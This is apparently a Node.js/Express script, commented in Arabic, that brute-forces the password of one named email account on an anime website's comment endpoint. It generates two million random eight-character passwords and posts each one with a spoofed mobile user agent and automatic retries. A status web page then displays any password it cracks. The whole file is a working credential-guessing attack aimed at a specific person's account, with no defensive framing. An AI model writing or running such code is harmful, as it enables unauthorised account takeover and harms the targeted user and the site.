const express = require("express");
const axios = require("axios");

const app = express();
const targetEmail = "abrheem16@gmail.com";
const animeId = "532";
const commentText = "TEST";
const renderURL = "https://noon-9v11.onrender.com/";

let foundPassword = null;
let finished = false;
let currentTries = [];
let allPasswords = [];
let currentIndex = 0;
const maxRetries = 5;
const rateLimitMs = 500; // 2 محاولات في الثانية

// توليد كلمات مرور عشوائية حسب النمط
function generatePasswords(count) {
  const letters = "abcdefghijklmnopqrstuvwxyz";
  const digits = "0123456789";
  const passwords = new Set();

  while (passwords.size < count) {
    let numDigits = Math.floor(Math.random() * 4); // 0 إلى 3 أرقام
    let numLetters = 8 - numDigits;

    let pass =
      Array.from({ length: numLetters }, () => letters[Math.floor(Math.random() * letters.length)]).join("") +
      Array.from({ length: numDigits }, () => digits[Math.floor(Math.random() * digits.length)]).join("");

    // مزج الباسورد
    pass = pass.split('').sort(() => Math.random() - 0.5).join('');
    passwords.add(pass);
  }

  return Array.from(passwords);
}

allPasswords = generatePasswords(2000000);

// تجربة باسورد معين
async function tryPassword(password, retries = maxRetries) {
  try {
    const res = await axios.post(
      "https://app.sanime.net/function/h10.php?page=addcmd",
      new URLSearchParams({
        email: targetEmail,
        password,
        item: JSON.stringify({ post: commentText, id: animeId, fire: false })
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)",
          Connection: "keep-alive"
        },
        timeout: 8000
      }
    );

    const data = res.data;
    if (data && typeof data === "object" && data.status === 1) {
      foundPassword = password;
      finished = true;
      console.log(`✅ كلمة المرور الصحيحة: ${password}`);
    }
  } catch (err) {
    if (!finished && retries > 0) {
      console.log(`⚠️ خطأ مع الباسورد ${password}... إعادة المحاولة (${maxRetries - retries + 1})`);
      await tryPassword(password, retries - 1);
    }
  }
}

// التشغيل
function bruteForceStart() {
  const interval = setInterval(async () => {
    if (finished || currentIndex >= allPasswords.length) {
      clearInterval(interval);
      finished = true;
      return;
    }

    const pwd = allPasswords[currentIndex];
    currentTries = [pwd];
    currentIndex++;
    tryPassword(pwd);
  }, rateLimitMs);
}

app.get("/", (req, res) => {
  const html = `
    <html>
      <head><meta http-equiv="refresh" content="5"><title>Brute Force</title></head>
      <body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px">
        <h1>🔐 كلمة المرور:</h1>
        ${
          foundPassword
            ? `<h2 style="color:#0f0">${foundPassword}</h2>`
            : finished
            ? `<h2 style="color:orange">❌ انتهت جميع المحاولات ولم يتم العثور على الباسورد الصحيح</h2>`
            : `<h2>جارٍ البحث... 🌀</h2><h3>تجريب: ${currentTries.join(" , ")}</h3>`
        }
        <p style="color:#888">📡 الرابط: <a href="${renderURL}">${renderURL}</a></p>
      </body>
    </html>
  `;
  res.send(html);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
  bruteForceStart();
});
